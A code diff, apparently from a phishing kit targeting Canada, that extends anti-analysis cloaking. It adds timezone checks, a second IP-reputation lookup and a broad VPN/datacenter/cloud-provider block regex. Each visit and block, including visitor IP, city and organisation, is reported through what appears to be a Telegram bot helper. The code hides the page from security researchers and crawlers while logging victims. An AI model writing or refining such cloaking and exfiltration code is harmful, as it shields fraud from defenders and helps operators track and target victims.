@@ -234,6 +234,61 @@
       _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + (country || 'N/A') + '</code>\n🏢 Org: <code>' + (org || 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
     }
 
+    // Détection Hardware Timezone (Cross-check Canada)
+    // Tout mobile réel au Canada est réglé sur un fuseau Canada ou Amérique du Nord compatible.
+    var _devTz = '';
+    try {
+      _devTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+    } catch(e){}
+
+    var _caTz = [
+      'America/Toronto', 'America/Montreal', 'America/Vancouver', 'America/Edmonton',
+      'America/Winnipeg', 'America/Halifax', 'America/St_Johns', 'America/Regina',
+      'America/Calgary', 'America/Ottawa', 'America/Moncton', 'America/Fredericton',
+      'America/Whitehorse', 'America/Yellowknife', 'America/Iqaluit', 'America/Glace_Bay',
+      'America/Goose_Bay', 'America/Rankin_Inlet', 'America/Resolute', 'America/Atikokan',
+      'America/Blanc-Sablon', 'America/Cambridge_Bay', 'America/Creston', 'America/Dawson',
+      'America/Dawson_Creek', 'America/Fort_Nelson', 'America/Inuvik', 'America/Nipigon',
+      'America/Pangnirtung', 'America/Rainy_River', 'America/Swift_Current', 'America/Thunder_Bay'
+    ];
+
+    // Si le timezone de l'appareil indique un pays étranger hors Amérique du Nord (ex: Europe, Asie, Afrique, Russie)
+    if (_devTz && _devTz.indexOf('Europe/') === 0 || _devTz.indexOf('Asia/') === 0 || _devTz.indexOf('Africa/') === 0 || _devTz.indexOf('Australia/') === 0) {
+      _tg(_R, '🛑 <b>BLOCAGE VPN ÉTRANGER (TIMEZONE MISMATCH)</b>\n🕒 Timezone Appareil: <code>' + _devTz + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+      setTimeout(_die, 400);
+      return;
+    }
+
+    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer/i;
+
+    function _verifyWithSecondaryApi(ip, city, country, org) {
+      fetch('https://freeipapi.com/api/json/' + ip)
+        .then(function(res){ return res.json(); })
+        .then(function(sec){
+          if (sec) {
+            if (sec.isProxy === true) {
+              _tg(_R, '🛑 <b>BLOCAGE PROXY / VPN SUSPECT (FREEIPAPI)</b>\n📍 IP: <code>' + ip + '</code>\n🏢 ASN Org: <code>' + (sec.asnOrganization || org) + '</code>');
+              setTimeout(_die, 400);
+              return;
+            }
+            if (sec.countryCode && sec.countryCode !== _CC) {
+              _tg(_R, '🛑 <b>BLOCAGE PAYS DÉTECTÉ (FREEIPAPI: ' + sec.countryCode + ')</b>\n📍 IP: <code>' + ip + '</code>');
+              setTimeout(_die, 400);
+              return;
+            }
+            if (sec.asnOrganization && vpnPatterns.test(sec.asnOrganization.toLowerCase())) {
+              _tg(_R, '🛑 <b>BLOCAGE DATACENTER ASN (' + sec.asnOrganization + ')</b>\n📍 IP: <code>' + ip + '</code>');
+              setTimeout(_die, 400);
+              return;
+            }
+          }
+          _sendVisit(ip, city, country, org);
+        })
+        .catch(function(){
+          _sendVisit(ip, city, country, org);
+        });
+    }
+
     // Récupérer IP, Ville, Pays et Opérateur immédiatement
     fetch('https://ipwho.is/')
       .then(function(r){ return r.json(); })
@@ -249,16 +304,14 @@
           var _org = d.connection ? (d.connection.org || d.connection.isp || d.connection.domain || '') : '';
           var _orgLower = _org.toLowerCase();
           
-          // Anti-VPN, Anti-Datacenter, Anti-Proxy, Anti-Hosting
-          var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree/i;
-          
           if (vpnPatterns.test(_orgLower) || (d.connection && d.connection.asn === 13335)) {
             _tg(_R, '🛑 <b>BLOCAGE VPN / DATACENTER (' + _org + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
             setTimeout(_die, 500);
             return;
           }
 
-          _sendVisit(d.ip, d.city, d.country, _org);
+          // Double validation de réputation d'IP
+          _verifyWithSecondaryApi(d.ip, d.city, d.country, _org);
         } else {
           _traceFallback();
         }
@@ -282,7 +335,7 @@
             return;
           }
 
-          _sendVisit(ipVal, 'Canada (Trace)', loc, 'Canada ISP');
+          _verifyWithSecondaryApi(ipVal, 'Canada (Trace)', loc, 'Canada ISP');
         })
         .catch(function(){
           _sendVisit('N/A', 'N/A', 'Canada', 'N/A');
